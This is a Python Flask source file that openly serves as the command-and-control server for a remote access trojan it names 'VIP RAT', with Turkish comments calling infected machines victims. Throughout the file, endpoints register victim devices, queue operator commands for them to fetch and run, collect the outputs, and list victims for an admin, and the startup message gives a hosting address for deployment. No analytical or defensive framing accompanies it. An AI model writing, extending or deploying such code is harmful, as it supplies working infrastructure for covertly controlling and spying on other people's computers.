# api_server.py
from flask import Flask, request, jsonify
import sqlite3
import json
import threading
import time
from datetime import datetime
import subprocess

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('rat.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id INTEGER PRIMARY KEY, domain TEXT, client_id TEXT, info TEXT, 
                  last_seen TIMESTAMP, commands TEXT, results TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, username TEXT, domain TEXT, api_key TEXT)''')
    conn.commit()
    return conn

db = init_db()

@app.route('/')
def home():
    return "🐍 VIP RAT API Server - Online"

@app.route('/api/register', methods=['POST'])
def register_client():
    """Kurban cihaz kaydı"""
    data = request.json
    domain = data.get('domain')
    client_id = data.get('client_id')
    info = data.get('info', {})
    
    # Client'ı kaydet
    c = db.cursor()
    c.execute('''INSERT OR REPLACE INTO clients 
                 (domain, client_id, info, last_seen, commands, results) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (domain, client_id, json.dumps(info), datetime.now(), '[]', '[]'))
    db.commit()
    
    print(f"🎯 YENİ CLIENT: {domain} - {client_id}")
    return jsonify({'status': 'success', 'message': 'Registered'})

@app.route('/api/check_commands/<domain>/<client_id>', methods=['GET'])
def check_commands(domain, client_id):
    """Kurban komut kontrolü"""
    c = db.cursor()
    c.execute('SELECT commands FROM clients WHERE domain=? AND client_id=?', 
              (domain, client_id))
    row = c.fetchone()
    
    if row:
        commands = json.loads(row[0])
        # Son görülme zamanını güncelle
        c.execute('UPDATE clients SET last_seen=? WHERE domain=? AND client_id=?',
                  (datetime.now(), domain, client_id))
        db.commit()
        
        return jsonify({'commands': commands, 'status': 'online'})
    
    return jsonify({'commands': [], 'status': 'not_found'})

@app.route('/api/send_result', methods=['POST'])
def send_result():
    """Kurban sonuç gönderimi"""
    data = request.json
    domain = data.get('domain')
    client_id = data.get('client_id')
    command = data.get('command')
    result = data.get('result')
    
    c = db.cursor()
    c.execute('SELECT results FROM clients WHERE domain=? AND client_id=?', 
              (domain, client_id))
    row = c.fetchone()
    
    if row:
        results = json.loads(row[0])
        results.append({'command': command, 'result': result, 'time': str(datetime.now())})
        
        c.execute('UPDATE clients SET results=? WHERE domain=? AND client_id=?',
                  (json.dumps(results), domain, client_id))
        db.commit()
        
        print(f"📨 RESULT: {domain} - {command}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'})

@app.route('/api/admin/clients/<domain>', methods=['GET'])
def get_clients(domain):
    """Admin: Client'ları listele"""
    c = db.cursor()
    c.execute('SELECT client_id, info, last_seen FROM clients WHERE domain=?', (domain,))
    clients = []
    
    for row in c.fetchall():
        clients.append({
            'client_id': row[0],
            'info': json.loads(row[1]),
            'last_seen': row[2],
            'online': (datetime.now() - datetime.fromisoformat(row[2])).seconds < 60
        })
    
    return jsonify({'clients': clients})

@app.route('/api/admin/send_command', methods=['POST'])
def send_command():
    """Admin: Komut gönder"""
    data = request.json
    domain = data.get('domain')
    client_id = data.get('client_id')
    command = data.get('command')
    
    c = db.cursor()
    c.execute('SELECT commands FROM clients WHERE domain=? AND client_id=?', 
              (domain, client_id))
    row = c.fetchone()
    
    if row:
        commands = json.loads(row[0])
        commands.append({
            'command': command,
            'sent_at': str(datetime.now()),
            'executed': False
        })
        
        c.execute('UPDATE clients SET commands=? WHERE domain=? AND client_id=?',
                  (json.dumps(commands), domain, client_id))
        db.commit()
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'})

@app.route('/api/admin/get_results/<domain>/<client_id>', methods=['GET'])
def get_results(domain, client_id):
    """Admin: Sonuçları al"""
    c = db.cursor()
    c.execute('SELECT results FROM clients WHERE domain=? AND client_id=?', 
              (domain, client_id))
    row = c.fetchone()
    
    if row:
        return jsonify({'results': json.loads(row[0])})
    
    return jsonify({'results': []})

if __name__ == '__main__':
    print("🚀 VIP RAT API Server Başlatılıyor...")
    print("🌐 Domain: https://your-domain.onrender.com")
    print("📊 API Endpoints:")
    print("  /api/register - Client kaydı")
    print("  /api/check_commands/<domain>/<client_id> - Komut kontrol")
    print("  /api/admin/clients/<domain> - Client listesi")
    app.run(host='0.0.0.0', port=5000, debug=False)
